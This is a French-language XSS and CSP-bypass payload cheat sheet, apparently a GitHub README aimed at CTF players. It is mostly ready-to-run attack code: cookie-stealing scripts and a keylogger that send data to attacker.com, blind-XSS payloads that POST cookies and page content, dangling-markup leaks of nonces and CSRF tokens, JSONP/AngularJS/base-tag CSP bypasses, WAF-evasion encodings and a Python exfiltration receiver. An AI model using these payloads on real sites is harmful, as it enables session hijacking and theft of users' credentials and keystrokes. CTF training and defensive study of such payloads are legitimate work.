# 💀 XSS & CSP Bypass — CTF Payload Arsenal
> **Author:** SPECTRA Mz | GitHub: [@exploit4040](https://github.com/exploit4040)  
> **Purpose:** Collection de payloads XSS et bypass CSP pour CTF & challenges (Root-Me, HackTheBox, picoCTF, etc.)  
> **Last updated:** 2026

---

## 📋 Table des Matières

1. [XSS Classiques](#1-xss-classiques)
2. [XSS Sans Guillemets / Filtres Basiques](#2-xss-sans-guillemets--filtres-basiques)
3. [XSS dans Attributs HTML](#3-xss-dans-attributs-html)
4. [XSS via Événements HTML](#4-xss-via-événements-html)
5. [XSS via Tags Alternatifs](#5-xss-via-tags-alternatifs)
6. [XSS DOM-Based](#6-xss-dom-based)
7. [XSS Encodés (Bypass WAF)](#7-xss-encodés-bypass-waf)
8. [XSS Polyglot](#8-xss-polyglot)
9. [XSS pour Vol de Cookies](#9-xss-pour-vol-de-cookies)
10. [XSS Blind (Out-of-band)](#10-xss-blind-out-of-band)
11. [CSP — Comprendre & Analyser](#11-csp--comprendre--analyser)
12. [CSP Bypass — JSONP](#12-csp-bypass--jsonp)
13. [CSP Bypass — Open Redirect](#13-csp-bypass--open-redirect)
14. [CSP Bypass — Nonce Leak](#14-csp-bypass--nonce-leak)
15. [CSP Bypass — Angular / Framework Injection](#15-csp-bypass--angular--framework-injection)
16. [CSP Bypass — strict-dynamic](#16-csp-bypass--strict-dynamic)
17. [CSP Bypass — base-uri](#17-csp-bypass--base-uri)
18. [CSP Bypass — Dangling Markup](#18-csp-bypass--dangling-markup)
19. [CSP Bypass — iFrame Sandbox](#19-csp-bypass--iframe-sandbox)
20. [CSP Bypass — DNS Exfiltration](#20-csp-bypass--dns-exfiltration)
21. [Outils & Ressources CTF](#21-outils--ressources-ctf)

---

## 1. XSS Classiques

### Payload de base — Alert
```html
<script>alert(1)</script>
```
> **Explication :** Injection directe d'une balise `<script>`. Fonctionne quand l'input est reflété sans encodage ni sanitisation. C'est le premier test à faire.

---

### Confirm / Prompt (si alert() est filtré)
```html
<script>confirm(1)</script>
<script>prompt(1)</script>
```
> **Explication :** Certains CTF filtrent `alert` via regex. `confirm()` et `prompt()` ont le même effet de preuve.

---

### console.log (stealth)
```html
<script>console.log(document.cookie)</script>
```
> **Explication :** Utile pour exfiltrer des données discrètement dans la console lors d'un blind XSS.

---

### XSS via src
```html
<script src="https://attacker.com/xss.js"></script>
```
> **Explication :** Charge un script externe. Nécessite que le CSP autorise des sources externes ou `*`. Pratique pour les payloads complexes.

---

## 2. XSS Sans Guillemets / Filtres Basiques

### Sans guillemets
```html
<script>alert(/XSS/)</script>
```
> **Explication :** Utilise une regex `/XSS/` à la place d'une string. Bypass les filtres qui bloquent `'` et `"`.

---

### Casser la syntaxe HTML
```html
</textarea><script>alert(1)</script>
</title><script>alert(1)</script>
</style><script>alert(1)</script>
```
> **Explication :** Si l'input est injecté dans un `<textarea>`, `<title>` ou `<style>`, on ferme le tag pour sortir du contexte et injecter du JS.

---

### Injection dans commentaire HTML
```html
--><script>alert(1)</script>
```
> **Explication :** Si l'input est placé dans `<!-- commentaire -->`, on ferme le commentaire avec `-->` puis on injecte.

---

## 3. XSS dans Attributs HTML

### Injection dans value=
```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```
> **Explication :** On ferme l'attribut `value` avec `"` puis on ajoute un événement. `autofocus onfocus` se déclenche sans interaction.

---

### Injection dans href
```html
javascript:alert(1)
```
> **Explication :** Le pseudo-protocole `javascript:` dans `href` ou `src` exécute du JS au clic (ou directement pour certains tags). Fonctionne dans `<a href="">`, `<iframe src="">`.

---

### Injection dans src d'image
```html
<img src=x onerror=alert(1)>
```
> **Explication :** L'image `x` n'existe pas → déclenche `onerror` → exécution JS. Très classique, ne nécessite pas `<script>`.

---

## 4. XSS via Événements HTML

### Événements universels
```html
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video autoplay oncanplay=alert(1)><source src=x></video>
```
> **Explication :** Ces événements se déclenchent automatiquement sans interaction utilisateur. `autofocus` + `onfocus` est très efficace dans les formulaires.

---

### Événements souris / clavier
```html
<div onmouseover="alert(1)">Hover me</div>
<div onclick="alert(1)">Click me</div>
<input onkeydown="alert(1)">
```
> **Explication :** Requièrent une interaction mais peuvent passer des filtres basiques. Utiles en Stored XSS.

---

### Événements CSS / animation
```html
<div style="animation-name:x" onanimationstart="alert(1)"></div>
```
> **Explication :** Déclenche un événement JS via une animation CSS. Peut bypass des filtres d'événements classiques.

---

## 5. XSS via Tags Alternatifs

### SVG
```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x></svg>
```
> **Explication :** SVG supporte du JS natif. `onload` sur SVG s'exécute immédiatement. Bypass les filtres qui blacklistent `<script>` mais oublient SVG.

---

### Math / Details / Object
```html
<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">click</maction></math>
<details open ontoggle=alert(1)>
<object data="javascript:alert(1)">
```
> **Explication :** Tags HTML5 moins connus, souvent oubliés par les sanitizers basiques.

---

### Template HTML5
```html
<template><script>alert(1)</script></template>
```
> **Explication :** Le contenu du tag `<template>` n'est pas rendu mais est parsé — peut leak via dangling markup dans certains contextes.

---

## 6. XSS DOM-Based

### Location/Hash
```html
https://target.com/page#<script>alert(1)</script>
```
> **Explication :** Si la page lit `location.hash` et l'insère dans le DOM via `innerHTML`, c'est du DOM XSS. Jamais envoyé au serveur → invisible pour les WAF serveur.

---

### innerHTML
```js
// Code vulnérable côté client :
document.getElementById('output').innerHTML = location.hash.slice(1);

// Payload :
https://target.com/#<img src=x onerror=alert(1)>
```
> **Explication :** `innerHTML` parse et exécute le HTML. Source la plus courante de DOM XSS.

---

### document.write
```js
// Code vulnérable :
document.write(location.search)

// Payload :
?q=<script>alert(1)</script>
```
> **Explication :** `document.write()` injecte directement dans le DOM. Contrôle complet du contexte.

---

### eval / setTimeout
```js
// Code vulnérable :
eval(location.hash.slice(1))
setTimeout(location.hash.slice(1), 0)

// Payload :
#alert(1)
```
> **Explication :** `eval()` et `setTimeout(string)` exécutent du JS arbitraire. Source DOM XSS critique.

---

### postMessage
```html
<iframe src="https://target.com" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')"></iframe>
```
> **Explication :** Si la page cible écoute `postMessage` sans vérifier l'origine et injecte le message dans le DOM → DOM XSS via `postMessage`.

---

## 7. XSS Encodés (Bypass WAF)

### Encodage HTML entities
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```
> **Explication :** `alert` encodé en HTML entities (`&#97;` = 'a', etc.). Le navigateur decode avant exécution. Bypass les WAF qui cherchent la string `alert`.

---

### Unicode escape
```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
```
> **Explication :** `\u0061` = 'a' en Unicode. JS supporte l'escape Unicode nativement dans les identifiants.

---

### Hex escape
```html
<script>\x61\x6C\x65\x72\x74(1)</script>
```
> **Explication :** Encodage hexadécimal du même `alert`. Même principe que Unicode.

---

### URL encoding (DOM XSS)
```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```
> **Explication :** `<script>alert(1)</script>` encodé en URL. Efficace si l'input est lu depuis `location` et décodé via `decodeURIComponent`.

---

### Double encodage
```
%253Cscript%253E
```
> **Explication :** `%25` = `%`, donc `%253C` → après premier decode → `%3C` → après second decode → `<`. Utile si le serveur décode deux fois.

---

### Commentaires JS pour casser les filtres
```html
<script>al/**/ert(1)</script>
<script>al<!-- -->ert(1)</script>
```
> **Explication :** Insertion de commentaires dans le mot-clé pour tromper les regex `alert`. Le navigateur ignore les commentaires.

---

### Backtick à la place de guillemets
```html
<img src=x onerror=alert`1`>
```
> **Explication :** Template literals avec backtick — pas de parenthèses, bypass les filtres sur `(` et `)`.

---

## 8. XSS Polyglot

### Polyglot universel
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
> **Explication :** Un seul payload conçu pour fonctionner dans un maximum de contextes différents (attribut, href, innerHTML, style, script...). Utilisé pour du fuzzing rapide.

---

### Polyglot compact
```
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><Script>prompt(1)</Script>@gmail.com,<<->>
```
> **Explication :** Couvre plusieurs contextes : string JS, attribut HTML, tag direct. Utile pour identifier rapidement le type d'injection.

---

## 9. XSS pour Vol de Cookies

### Exfil vers serveur attaquant
```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>
<script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>
```
> **Explication :** Trois méthodes d'exfiltration : redirect, pixel tracking (discret), fetch (moderne). `btoa()` encode en Base64 pour éviter les problèmes de caractères spéciaux dans l'URL.

---

### XMLHttpRequest
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/?c=' + document.cookie, true);
xhr.send();
</script>
```
> **Explication :** Méthode classique. Visible dans les DevTools Network mais fonctionne même quand `fetch` est restreint.

---

### Via WebSocket
```html
<script>
var ws = new WebSocket('wss://attacker.com');
ws.onopen = function(){ ws.send(document.cookie) };
</script>
```
> **Explication :** WebSocket peut bypass certains CSP qui ne bloquent pas `connect-src wss://`. Exfiltration bidirectionnelle possible.

---

### Keylogger XSS
```html
<script>
document.onkeypress = function(e) {
  new Image().src = 'https://attacker.com/key?k=' + e.key;
}
</script>
```
> **Explication :** Capture chaque touche tapée et l'exfiltre. Utilisé en Stored XSS pour voler des mots de passe saisis après injection.

---

## 10. XSS Blind (Out-of-band)

### XSS Hunter / Interactsh
```html
<script src="https://xsshunter.com/YOURID"></script>
<script>new Image().src='https://YOURID.interact.sh/?c='+document.cookie</script>
```
> **Explication :** Quand tu ne vois pas le résultat directement (panneau admin, logs...). Ces services reçoivent la requête et t'alertent. **XSS Hunter** enregistre aussi la page complète.

---

### Payload complet blind
```html
<script>
var d = {
  c: document.cookie,
  u: document.URL,
  r: document.referrer,
  h: document.innerHTML.substring(0,500)
};
fetch('https://attacker.com/blind', {
  method: 'POST',
  body: JSON.stringify(d)
});
</script>
```
> **Explication :** Collecte cookie + URL + referrer + fragment de page et exfiltre via POST. Maximise l'information lors d'un blind XSS.

---

## 11. CSP — Comprendre & Analyser

### Lire le CSP
```bash
curl -sI https://target.com | grep -i content-security
```

### Structure d'un CSP
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src *;
  connect-src 'self';
  frame-src 'none';
  base-uri 'self';
  form-action 'self';
```

### Directives critiques à analyser

| Directive | Si manquante/faible | Impact |
|---|---|---|
| `script-src` | `unsafe-inline` ou `*` | XSS direct possible |
| `default-src` | Absente | Pas de fallback, tout permis |
| `base-uri` | Absente | base-uri injection possible |
| `form-action` | Absente | Redirect de formulaire possible |
| `connect-src` | `*` | Exfiltration libre |
| `frame-src` | `*` | Clickjacking |

### Outil en ligne
```
https://csp-evaluator.withgoogle.com/
```
> **Explication :** Colle le CSP ici, il identifie automatiquement les faiblesses. Indispensable en CTF.

---

## 12. CSP Bypass — JSONP

### Principe
Si le CSP whitelist un domaine qui expose un endpoint JSONP, on peut exécuter du JS arbitraire.

```html
<!-- CSP: script-src https://www.google.com -->
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)//"></script>

<!-- CSP: script-src https://accounts.google.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?token=alert(1)"></script>
```

### Rechercher des endpoints JSONP sur un domaine whitelisté
```
https://target-cdn.com/api/data?callback=alert(1)
https://target-cdn.com/jsonp?cb=alert(1)
```
> **Explication :** Un endpoint JSONP répond `callback(data)`. Si on contrôle `callback`, on injecte `alert(1)` → le navigateur charge le script depuis le domaine whitelisté et exécute `alert(1)(data)`.

---

## 13. CSP Bypass — Open Redirect

### Principe
Si le CSP whitelist `https://trusted.com` et que ce domaine a un open redirect, on peut pointer vers un script malveillant.

```html
<!-- CSP: script-src https://trusted.com -->
<script src="https://trusted.com/redirect?url=https://attacker.com/evil.js"></script>
```
> **Explication :** Le navigateur suit le redirect → charge `evil.js` depuis `attacker.com`, mais considère que la source était `trusted.com`. **Attention :** les navigateurs modernes ont partiellement corrigé ce comportement selon les modes.

---

## 14. CSP Bypass — Nonce Leak

### Lire le nonce dans le DOM
```js
// Le nonce est dans le DOM :
// <script nonce="abc123">...</script>

// Payload si injection dans un attribut visible :
" onmouseover="alert(document.querySelector('script').nonce)
```

### Dangling Markup pour exfiltrer le nonce
```html
<!-- Injection dans du HTML avant un script nonced -->
<img src='https://attacker.com/?leak=
```
> **Explication :** Si on injecte avant un tag `<script nonce="...">`, le navigateur envoie le reste du HTML (incluant le nonce) comme valeur du `src` → on reçoit le nonce sur notre serveur → on le réutilise pour injecter notre script.

---

### Utiliser le nonce leaked
```html
<script nonce="LEAKED_NONCE">alert(1)</script>
```
> **Explication :** Une fois le nonce en main, on l'ajoute à notre tag `<script>` et il passe la vérification CSP.

---

## 15. CSP Bypass — Angular / Framework Injection

### AngularJS sandbox escape (< 1.6)
```html
<!-- CSP: script-src https://ajax.googleapis.com (AngularJS whitelisté) -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```
> **Explication :** Angular 1.x utilise `$eval` sur les templates `{{ }}`. On peut s'échapper du sandbox pour exécuter du JS arbitraire via l'accès au `constructor`.

---

### Angular template injection sans script
```html
{{$on.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
```
> **Explication :** Accès au constructeur de Function via des propriétés JS standard. Pas besoin de `<script>`, fonctionne dans n'importe quel contexte AngularJS.

---

## 16. CSP Bypass — strict-dynamic

### Principe
`'strict-dynamic'` permet aux scripts déjà approuvés (par nonce/hash) de charger d'autres scripts dynamiquement.

```html
<!-- Si on peut injecter dans un script déjà nonced -->
<script nonce="valid">
  var s = document.createElement('script');
  s.src = 'https://attacker.com/evil.js';
  document.head.appendChild(s);
</script>
```
> **Explication :** Le script parent est approuvé → il crée un enfant dynamiquement → `strict-dynamic` approuve automatiquement les scripts créés par des scripts approuvés.

---

## 17. CSP Bypass — base-uri

### Injection base tag
```html
<!-- CSP sans base-uri -->
<base href="https://attacker.com/">
```
> **Explication :** Si `base-uri` n'est pas défini dans le CSP, on peut injecter un tag `<base>` qui redirige toutes les URLs relatives vers notre domaine. Les scripts chargés via `<script src="./app.js">` iront sur `attacker.com/app.js`.

---

### Résultat
```html
<!-- Page originale -->
<script src="./utils.js"></script>

<!-- Avec notre <base> injecté avant -->
<!-- Le navigateur charge https://attacker.com/utils.js -->
```

---

## 18. CSP Bypass — Dangling Markup

### Principe
Exfiltrer du HTML sans exécuter de JS (quand `script-src` est strict mais `img-src` est permissif).

```html
<!-- Injection : -->
<img src='https://attacker.com/?data=
<!-- Le navigateur envoie tout le HTML suivant comme valeur de src jusqu'au prochain ' -->
```

### Exfiltrer un token CSRF
```html
<img src='https://attacker.com/leak?html=
```
> **Explication :** Si un token CSRF est dans le HTML après notre injection, il sera envoyé dans la requête d'image. Bypass complet du CSP sur `script-src` car on n'exécute aucun script.

---

## 19. CSP Bypass — iFrame Sandbox

### iFrame sans CSP
```html
<iframe src="https://attacker.com/page.html" sandbox="allow-scripts allow-same-origin"></iframe>
```
> **Explication :** Le CSP de la page parent ne s'applique pas forcément aux iframes. Si on peut injecter une iframe vers un domaine contrôlé, le JS s'exécute dans le contexte de l'iframe.

---

### srcdoc
```html
<iframe srcdoc="<script>parent.alert(1)</script>"></iframe>
```
> **Explication :** `srcdoc` permet d'injecter du HTML directement dans l'iframe. `parent.` accède au contexte de la page parent. Bypass souvent les CSP car c'est un document inline.

---

## 20. CSP Bypass — DNS Exfiltration

### Via CSS (sans JS)
```html
<style>
@import url('https://attacker.com/?css');
body { background: url('https://attacker.com/?body') }
</style>
```
> **Explication :** Si `style-src` est permissif mais `script-src` est strict. On exfiltre via des requêtes CSS. Pas de données complexes mais confirme l'exécution et peut leak via `font-face` ou `@import` timing.

---

### Via link prefetch
```html
<link rel="prefetch" href="https://attacker.com/?leak">
<link rel="dns-prefetch" href="//attacker.com">
```
> **Explication :** Déclenche une requête DNS/HTTP sans JS. Utile pour confirmer une injection même sous CSP stricte. Certains CSP oublient de restreindre `prefetch-src`.

---

### Via WebRTC (leak IP / exfil)
```html
<script>
var pc = new RTCPeerConnection({iceServers:[{urls:'stun:attacker.com:3478'}]});
pc.createDataChannel('');
pc.createOffer().then(o=>pc.setLocalDescription(o));
</script>
```
> **Explication :** WebRTC peut contacter des serveurs STUN arbitraires même si `connect-src` est restreint. Leak l'IP locale et exfiltre via UDP.

---

## 21. Outils & Ressources CTF

### Outils indispensables

| Outil | Usage |
|---|---|
| [XSS Hunter](https://xsshunter.trufflesecurity.com/) | Blind XSS callback |
| [Interactsh](https://interact.projectdiscovery.io/) | Out-of-band requests |
| [CSP Evaluator](https://csp-evaluator.withgoogle.com/) | Analyse CSP |
| [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | Référence complète |
| [PentestMonkey XSS](http://pentestmonkey.net/cheat-sheet/xss) | Cheat sheet |
| Burp Suite | Intercept & test |
| Browser DevTools | DOM XSS debugging |

---

### Méthodologie CTF XSS en 5 étapes

```
1. IDENTIFIER le point d'injection (param GET/POST, header, cookie, fragment)
2. TESTER le contexte (HTML brut, attribut, JS, CSS, URL)
3. LIRE le CSP (curl -I ou DevTools > Network)
4. ANALYSER le CSP sur csp-evaluator.withgoogle.com
5. CHOISIR le vecteur d'attaque adapté
```

---

### Checklist rapide CSP

```
[ ] unsafe-inline présent ?          → XSS direct
[ ] unsafe-eval présent ?            → eval() / Function() dispo
[ ] wildcard * dans script-src ?     → charger depuis n'importe où
[ ] domaine whitelisté avec JSONP ?  → JSONP bypass
[ ] nonce statique ou prédictible ?  → nonce reuse
[ ] base-uri absent ?                → base tag injection
[ ] strict-dynamic + nonce leak ?    → dynamic script creation
[ ] img-src permissif ?              → dangling markup
[ ] connect-src * ?                  → exfil libre via fetch/XHR
```

---

### Serveur d'exfiltration rapide (Python)
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        data = urllib.parse.unquote(self.path)
        print(f"[RECV] {self.client_address[0]} → {data}")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

    def log_message(self, *args): pass

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```
> Lance avec `python3 server.py` — reçoit toutes les requêtes d'exfiltration XSS.

---

## Ressources

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
- [Root-Me XSS Challenges](https://www.root-me.org/fr/Challenges/Web-Client/)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

> ⚠️ **Usage éthique uniquement.** Ces payloads sont destinés à des environnements CTF, challenges légaux, et labs de sécurité. Ne jamais utiliser sur des systèmes sans autorisation explicite.

*Made with 💀 by SPECTRA Mz — [exploit4040.github.io/MZ](https://exploit4040.github.io/MZ/)*
